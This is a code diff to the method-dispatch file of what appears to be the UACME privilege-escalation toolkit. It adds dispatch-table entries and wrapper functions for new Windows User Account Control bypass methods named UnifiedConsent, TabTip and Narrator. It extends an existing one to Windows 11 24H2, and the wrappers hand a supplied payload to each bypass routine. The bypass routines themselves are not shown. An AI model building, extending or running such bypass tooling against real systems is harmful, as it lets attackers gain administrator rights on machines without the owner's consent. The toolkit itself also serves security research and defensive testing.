@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.70
+*  VERSION:     3.71
 *
-*  DATE:        21 May 2026
+*  DATE:        21 Jul 2026
 *
 *  UAC bypass dispatch.
 *
@@ -55,6 +55,9 @@ UCM_API(MethodSspiDatagram);
 UCM_API(MethodRequestTrace);
 UCM_API(MethodQuickAssist);
 UCM_API(MethodCleanMgrAdmin);
+UCM_API(MethodUnifiedConsent);
+UCM_API(MethodTabTip);
+UCM_API(MethodNarrator);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodNICPoison,
@@ -66,7 +69,10 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodVFServerDiagProf,
     UacMethodAtlHijack,
     UacMethodQuickAssist,
-    UacMethodCleanMgrAdmin
+    UacMethodCleanMgrAdmin,
+    UacMethodUnifiedConsent,
+    UacMethodTabTip,
+    UacMethodNarrator
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[] = {
@@ -94,8 +100,12 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[] = {
     { UacMethodVFServerDiagProf,    MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
     { UacMethodIscsiCpl,            MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
     { UacMethodAtlHijack,           MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodRequestTrace,        MethodRequestTrace, { NT_WIN11_24H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { UacMethodQuickAssist,         MethodQuickAssist, { NT_WIN10_REDSTONE5, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { UacMethodCleanMgrAdmin,       MethodCleanMgrAdmin, { NT_WIN10_21H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { UacMethodCleanMgrAdmin,       MethodCleanMgrAdmin, { NT_WIN10_21H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodUnifiedConsent,      MethodUnifiedConsent, { NT_WIN10_21H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodTabTip,              MethodTabTip, { NT_WIN8_BLUE, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { UacMethodNarrator,            MethodNarrator, { NT_WIN10_REDSTONE5, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -314,7 +324,9 @@ NTSTATUS MethodsManagerCall(
     
     PUCM_API_DISPATCH_ENTRY Entry;
 
-    UCM_PARAMS_BLOCK ParamsBlock;
+    UCM_ARGS_BLOCK ArgsBlock;
+    UACME_PARAM_BLOCK SharedParams;
+
     SUP_EXECUTABLE_LIST TrustedAppList;
     SUP_EXECUTABLE_ENTRY *TrustedApp;
 
@@ -393,9 +405,9 @@ NTSTATUS MethodsManagerCall(
         }
     }
 
-    ParamsBlock.Method = Method;
-    ParamsBlock.PayloadCode = PayloadCode;
-    ParamsBlock.PayloadSize = PayloadSize;
+    ArgsBlock.Method = Method;
+    ArgsBlock.PayloadCode = PayloadCode;
+    ArgsBlock.PayloadSize = PayloadSize;
 
     ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Entry->SetParameters"), Entry->SetParameters, FALSE);
 
@@ -406,11 +418,14 @@ NTSTATUS MethodsManagerCall(
     //   2. Optional parameter from Akagi command line.
     //
     if (Entry->SetParameters) {
-        bParametersBlockSet = supCreateSharedParametersBlock(g_ctx);
+        RtlSecureZeroMemory(&SharedParams, sizeof(UACME_PARAM_BLOCK));
+        bParametersBlockSet = supCreateSharedParametersBlock(g_ctx, Method, &SharedParams);
         ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->supCreateSharedParametersBlock"), bParametersBlockSet, FALSE);
+        ucmConsolePrintText(TEXT("[+] SharedParams->szOptionalParameter1"), SharedParams.szOptionalParameter1);
+        ucmConsolePrintText(TEXT("[+] SharedParams->szOptionalParameter2"), SharedParams.szOptionalParameter2);
     }
 
-    MethodResult = Entry->Routine(&ParamsBlock);
+    MethodResult = Entry->Routine(&ArgsBlock);
 
     if (PayloadCode) {
         RtlSecureZeroMemory(PayloadCode, PayloadSize);
@@ -914,6 +929,18 @@ UCM_API(MethodRequestTrace)
 #endif
 }
 
+UCM_API(MethodUnifiedConsent)
+{
+#ifdef _WIN64
+    return ucmUnifiedConsentMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#else
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#endif
+}
+
 UCM_API(MethodQuickAssist)
 {
 #ifdef _WIN64
@@ -930,6 +957,30 @@ UCM_API(MethodCleanMgrAdmin)
 {
 #ifdef _WIN64
     return ucmCleanMgrAdminMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#else
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#endif
+}
+
+UCM_API(MethodTabTip)
+{
+#ifdef _WIN64
+    return ucmTabTipMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#else
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#endif
+}
+
+UCM_API(MethodNarrator)
+{
+#ifdef _WIN64
+    return ucmNarratorMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 #else
